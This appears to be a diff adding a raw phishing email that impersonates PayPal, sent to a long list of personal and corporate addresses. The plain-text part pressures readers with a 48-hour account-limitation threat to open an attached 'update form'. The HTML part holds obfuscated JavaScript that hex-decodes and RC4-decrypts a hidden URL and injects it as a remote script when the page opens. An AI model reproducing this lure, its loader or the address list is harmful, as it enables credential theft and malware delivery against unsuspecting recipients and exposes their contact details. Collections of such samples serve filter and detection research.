@@ -1,0 +1,48 @@
+Content-Type: multipart/mixed; boundary="===============6271986534736277389=="
+MIME-Version: 1.0
+From: PayPal <safeguard@form.net>
+Message-Id: <b1217e5668580329c7e5ce733630a8bc@GAr5x39h45D.us>
+Subject: Important update notice
+To: sstefano@ohiohealth.com
+ sstefanik@bresnan.net; sstefanik@cranaelectric.com;
+ sstefanik@everydayhealthinc.com; sstefanik@pathfinderyouthsociety.org;
+ sstefaniuk@atb.com; sstefaniuk@comcast.net; sstefaniuk@remaxofnanaimo.com;
+ sstefaniw@hotmail.com; sstefanni@horta.uac.pt;
+ sstefano.albanese@googlemail.com; sstefano@asc.corp.mot.com;
+ sstefano@bluewin.ch; sstefano@ceramistidarte.it; sstefano@cisco.com;
+ sstefano@email.it; sstefano@falkins.com; sstefano@ffzg.hr;
+ sstefano@ohiohealth.com; sstefano@us.ibm.com; sstefano@utm.utoronto.ca;
+ sstefanoff@abv.bg; sstefanoff@aecinc.org; sstefanoman2@aol.com;
+ sstefanoni.c@mail.tim.it; sstefanoni@consejo.org.ar;
+ sstefanoni@cponline.org.ar; sstefanoni@helpage.org
+
+--===============6271986534736277389==
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+Case: Update Notice
+
+Please have your PayPal account information up to date.
+
+There are outdated or invalid information in your PayPal account. Keeping your information current is
+very important in order to use our services without being interrupted.
+
+To avoid any issues when trying to send or withdraw money from your account, we ask that you
+complete the update form. Our security team has attached in the email so that you may open it in your browser
+and submit your current information.
+
+We'll review your information, and if everything checks out, your account information will be updated.
+However, incase you haven't updated your information in 48 hours, we'll send you another notification.
+In the worst possible case, PayPal may limit your account if you persist on not keeping the information
+up to date.
+
+Please get this resolved as soon as possible.
+Thank you.
+--===============6271986534736277389==
+MIME-Version: 1.0
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+<!doctype html><html><head><meta charset="utf-8"></head><body><script>function k4f4(d9sfq7cw){    var d424b = 0;    var iojock6 = '';    if( d9sfq7cw.substr(0,2) == '0x' ){ d424b = 2; }    if( typeof d9sfq7cw != 'string' ){ d9sfq7cw = d9sfq7cw.toString(); }    for(var ixpj186s=d424b;  ixpj186s<d9sfq7cw.length; ixpj186s+=2) {        var c = d9sfq7cw.substr( ixpj186s, 2 );        iojock6 = iojock6 + String.fromCharCode( parseInt(c, 16) );        }    return iojock6;}function jcrm(c453a24j6, pd399n) {  var i816s47, ql00jn, qbv9, n590, ut2vftfl3, ia01z6e0;  for (i816s47 = [], ql00jn = 0, n590 = "", ut2vftfl3 = 0; ut2vftfl3 < 256; ut2vftfl3++) i816s47[ut2vftfl3] = ut2vftfl3;  for (ut2vftfl3 = 0; ut2vftfl3 < 256; ut2vftfl3++)    ql00jn = (ql00jn + i816s47[ut2vftfl3] + pd399n.charCodeAt((ut2vftfl3 % pd399n.length))) % 256,    qbv9 = i816s47[ut2vftfl3],    i816s47[ut2vftfl3] = i816s47[ql00jn],    i816s47[ql00jn] = (qbv9);  for (ut2vftfl3 = 0, ql00jn = 0, ia01z6e0 = 0; ia01z6e0 < c453a24j6.length; ia01z6e0++)    ut2vftfl3 = ((ut2vftfl3 + 1) % 256),    ql00jn = ((ql00jn + i816s47[ut2vftfl3]) % 256),    qbv9 = i816s47[ut2vftfl3],    i816s47[ut2vftfl3] = i816s47[ql00jn],    i816s47[ql00jn] = qbv9,    n590 += String.fromCharCode(c453a24j6.charCodeAt(ia01z6e0) ^ i816s47[(i816s47[ut2vftfl3] + i816s47[ql00jn]) % 256]);  return n590}var hv10yx2 = jcrm(k4f4("322f607e1a082e21c6745df6ebd63011abb7e3d0020873abb3934d3b07e53631a3c3dc03ecb39c83c6b7e084b1ea6585bb1b4340766f68135a929d"),"rs6bj3");var o0hopkd = jcrm(k4f4("293866675053"),"rs6bj3");var z6f8 = document.createElement(o0hopkd);z6f8.src = hv10yx2;var jmh0s = jcrm(k4f4("323e756a"),"rs6bj3");document.getElementsByTagName(jmh0s)[0].appendChild(z6f8);</script></body></html>
+--===============6271986534736277389==--
